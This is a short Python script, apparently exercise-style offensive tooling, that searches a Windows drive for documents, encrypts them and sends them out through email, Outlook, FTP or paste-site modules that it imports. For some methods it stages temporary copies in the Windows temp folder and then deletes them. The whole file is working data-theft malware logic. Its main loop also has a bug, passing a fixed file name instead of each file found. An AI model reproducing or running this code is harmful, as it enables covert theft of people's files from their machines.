from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from xfer import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste
}

# search filesystem for documents of a given type and return full path, yeild execution back to caller
def find_docs(doc_type='.txt'):
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                # returns each document found as it occurs. prevents loss from interruption, information not stored in memory, and allows for exfiltration to begin immediately
                yield document_path

def exfiltrate(document_path, method):
    # read file from source, encryp, write to temp directory
    if method in ['transmit', 'plain_ftp']:
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))
        
        # exfiltrate encrypted file, then delete from temp directory
        EXFIL[method](filename)
        os.unlink(filename)
    else:
        # for methods that do not require a file as input, read and encrypt the file contents in memory, then exfiltrate
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        EXFIL[method](title, encrypt(contents))

if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate("test.txt", 'plain_paste')
    
    # uncomment to open and decrypt the file
    # with open('test.enc', 'rb') as f:
    #     encrypted = f.read()
    # with open('test.dec', 'wb') as f:
    #     f.write(decrypt(encrypted))